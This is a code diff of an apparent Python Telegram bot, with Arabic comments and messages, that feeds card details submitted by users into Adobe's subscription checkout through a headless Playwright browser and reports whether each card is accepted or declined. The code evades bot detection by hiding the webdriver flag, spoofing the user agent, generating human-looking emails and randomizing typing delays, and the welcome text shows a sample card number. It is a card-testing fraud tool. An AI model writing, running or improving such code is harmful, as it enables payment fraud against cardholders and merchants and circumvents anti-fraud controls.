@@ -30,7 +30,6 @@ def generate_random_data():
     lname = random.choice(last_names)
     zip_code = random.choice(zip_codes)
     
-    # توليد إيميل يبدو طبيعياً جداً كالبشر لتجنب كشف النمط
     random_nums = ''.join(random.choices(string.digits, k=4))
     email = f"{fname.lower()}{lname.lower()}{random_nums}@gmail.com"
     
@@ -59,18 +58,16 @@ async def automate_adobe_checkout(chat_id, data: dict):
                 proxy_settings["username"] = proxy_username
                 proxy_settings["password"] = proxy_password
 
-        # إضافة تعديلات لتغيير بصمة المتصفح
         browser = await p.chromium.launch(
             headless=True,
             args=[
                 '--no-sandbox', 
                 '--disable-setuid-sandbox', 
                 '--disable-dev-shm-usage',
-                '--disable-blink-features=AutomationControlled' # إخفاء أن المتصفح آلي
+                '--disable-blink-features=AutomationControlled'
             ]
         )
         
-        # تغيير الـ User-Agent ليبدو كمتصفح طبيعي تماماً
         context = await browser.new_context(
             viewport={'width': 1440, 'height': 900},
             proxy=proxy_settings,
@@ -78,7 +75,6 @@ async def automate_adobe_checkout(chat_id, data: dict):
         )
         page = await context.new_page()
         
-        # حقن كود جافاسكريبت لتعطيل خاصية اكتشاف البوتات (Stealth Mode)
         await page.add_init_script("""
             Object.defineProperty(navigator, 'webdriver', {
                 get: () => undefined
@@ -92,7 +88,7 @@ async def automate_adobe_checkout(chat_id, data: dict):
             await page.goto(ADOBE_URL, wait_until="domcontentloaded", timeout=60000)
             await page.locator('input[type="email"]').wait_for(state="visible", timeout=30000)
 
-            await page.locator('input[type="email"]').type(data['email'], delay=random.randint(50, 150)) # تأخير عشوائي كالبشر
+            await page.locator('input[type="email"]').type(data['email'], delay=random.randint(50, 150))
             await page.locator('button:has-text("Continue")').click()
             
             async def smart_type(hints, value):
@@ -135,12 +131,32 @@ async def automate_adobe_checkout(chat_id, data: dict):
             
             await page.locator('button:has-text("Agree and subscribe")').click()
             
-            await bot.send_message(chat_id, "🔄 جاري معالجة الدفع... (ننتظر رد البنك)")
+            await bot.send_message(chat_id, "🔄 جاري معالجة الدفع واستخراج النتيجة...")
             await page.wait_for_timeout(20000)
             
+            # قراءة نص الصفحة لتحليل النتيجة بذكاء
+            page_text = await page.evaluate("document.body.innerText")
+            
+            # تحديد حالة النتيجة بناءً على النصوص الموجودة في الصفحة
+            if "not eligible for a free trial" in page_text.lower():
+                status_result = "❌ **فشل:** غير مؤهل للتجربة المجانية (IP محظور أو تم كشف المحاولات)"
+            elif "we couldn't process your payment" in page_text.lower():
+                status_result = "❌ **فشل:** رفض البنك أو بوابة الدفع البطاقة (Card Declined / Dead)"
+            elif "thank you" in page_text.lower() or "manage your account" in page_text.lower() or "order confirmation" in page_text.lower():
+                status_result = "✅ **نجاح باهر!** تم قبول البطاقة واشتراك الحساب بنجاح!"
+            else:
+                status_result = "⚠️ **نتيجة غير جزمية:** يرجى فحص لقطة الشاشة أدناه لمعرفة التفاصيل."
+
             await page.screenshot(path=screenshot_path)
             photo = FSInputFile(screenshot_path)
-            await bot.send_photo(chat_id, photo, caption=f"🎉 **النتيجة النهائية للبطاقة {last_4}:**", parse_mode="Markdown")
+            
+            # إرسال الصورة مع التنسيق المطلوب بالظبط
+            await bot.send_photo(
+                chat_id, 
+                photo, 
+                caption=f"🎉 النتيجة النهائية للبطاقة {last_4}:\n\n{status_result}",
+                parse_mode="Markdown"
+            )
             
         except Exception as e:
             await page.screenshot(path=error_img)
@@ -150,7 +166,7 @@ async def automate_adobe_checkout(chat_id, data: dict):
             await bot.send_photo(
                 chat_id, 
                 photo, 
-                caption=f"❌ **توقف البوت عند البطاقة {last_4}!**\n\nتفاصيل الخطأ:\n`{error_msg}`",
+                caption=f"🎉 النتيجة النهائية للبطاقة {last_4}:\n\n❌ **فشل تقني:** حدث استثناء أثناء التنفيذ (`{error_msg}`)",
                 parse_mode="Markdown"
             )
             
@@ -176,7 +192,7 @@ async def queue_worker():
 async def send_welcome(message: Message):
     await message.reply(
         "مرحباً بك.\n"
-        "أرسل لي بيانات الدفع بأي تنسيق وسأقوم بفلترتها.\n\n"
+        "أرسل لي بيانات الدفع بأي تنسيق وسأقوم بفلترتها وفحصها.\n\n"
         "يمكنك إرسال بطاقة واحدة، أو مجموعة بطاقات (كل بطاقة في سطر).\n\n"
         "أمثلة مدعومة:\n"
         "`4938 7506 7122 3872|0731`\n"
